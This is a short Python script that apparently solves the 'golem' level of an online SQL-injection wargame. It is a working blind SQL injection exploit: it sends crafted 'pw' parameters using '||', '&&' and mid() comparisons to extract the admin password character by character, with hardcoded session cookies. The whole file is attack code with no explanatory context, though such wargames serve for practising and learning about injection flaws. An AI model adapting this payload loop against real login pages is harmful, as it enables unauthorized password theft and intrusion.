import requests

URL="http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?"
cookie={
    "__cfduid":"d33f226e52742a4101c7fa523b51564201526036891",
    "PHPSESSID":"u3lic0rsj39ldqe5gktriat692"
    }
session1=requests.Session()
pw = ""
for i in range(8):
    for j in range(32,127):
        data ="pw=1'|| id<'b' %26%26 mid(pw,"+str(i+1)+",1)<'"+chr(j)
        req1=session1.get(URL+data,cookies=cookie)
        if req1.text.find("Hello admin") > -1 :
            pw = pw+chr(j-1)
            print (pw)
            break
